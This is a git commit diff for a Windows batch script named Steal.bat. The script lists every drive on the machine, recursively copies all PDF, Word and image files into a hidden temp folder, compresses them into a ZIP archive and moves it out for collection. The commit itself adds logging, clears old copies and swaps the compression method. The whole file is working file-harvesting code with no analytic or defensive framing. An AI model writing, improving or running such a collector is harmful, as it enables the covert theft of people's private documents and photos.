8d59d6b66d80c30712b06cfd107b3051b6bc494e
Noth <45315211+zxc7528064@users.noreply.github.com>
2025-01-09 10:17:16 +0800

    Update Steal.bat

--- Steal.bat
+++ Steal.bat
@@ -1,55 +1,62 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Initialize variables
+
 set targetDir=C:\Windows\Temp\collected_files
 set zipFile=C:\Windows\Temp\collected_files.zip
 set fileCount=0
 set count=0
 
-:: Get all drives and store them in an array
+
+
 for /f "tokens=1 delims=" %%d in ('wmic logicaldisk get caption ^| find ":"') do (
+    echo Found drive: %%d
     set "drive[!count!]=%%d"
     set /a count+=1
 )
 
-:: Check and create the target directory
 if not exist "%targetDir%" (
     mkdir "%targetDir%"
 )
 
-:: Iterate through each drive
+
+echo Clearing old files in the target folder...
+del /q /f "%targetDir%\*.*" >nul 2>&1
+
+
 for /L %%i in (0,1,%count%-1) do (
     set "currentDrive=!drive[%%i]!"
-    echo Processing drive !currentDrive!...
+    echo Processing drive !currentDrive!
+
+
     call :processDrive !currentDrive!
 )
 
-:: Output the file statistics
+
 if %fileCount% gtr 0 (
-    echo Copied %fileCount% files to %targetDir%.
+    echo %fileCount% files have been copied to %targetDir%. 
+    echo Starting file compression, please wait...
 ) else (
     echo No matching files found.
+    goto :eof
 )
 
-:: Compress the folder into a ZIP file
-echo Compressing the folder into a ZIP file...
-if exist "%zipFile%" (
-    del "%zipFile%"
-    echo Deleted the old ZIP file.
-)
-powershell -Command "Compress-Archive -Path '%targetDir%\*' -DestinationPath '%zipFile%' -Force"
 
-:: Check compression results
 if exist "%zipFile%" (
-    echo Compression completed! File path: %zipFile%
+    echo Found old zip file, deleting it...
+    del /q /f "%zipFile%"
+)
+
+
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%targetDir%', '%zipFile%')"
+
+
+if exist "%zipFile%" (
+    echo Files have been compressed to %zipFile%. 
+    move %zipFile% ..
 ) else (
-    echo Compression failed!
+    echo Compression failed.
 )
-
-:: Clean up the temporary folder (optional)
-:: echo Cleaning up the temporary folder...
-:: rmdir /s /q "%targetDir%"
 
 pause
 goto :eof
@@ -57,6 +64,7 @@ goto :eof
 :processDrive
 set "drivePath=%1"
 for /r "%drivePath%\" %%f in (*.pdf *.docx *.png *.jpg) do (
+    @REM echo Found file: %%f
     copy "%%f" "%targetDir%" >nul 2>&1
     if not errorlevel 1 (
         set /a fileCount+=1
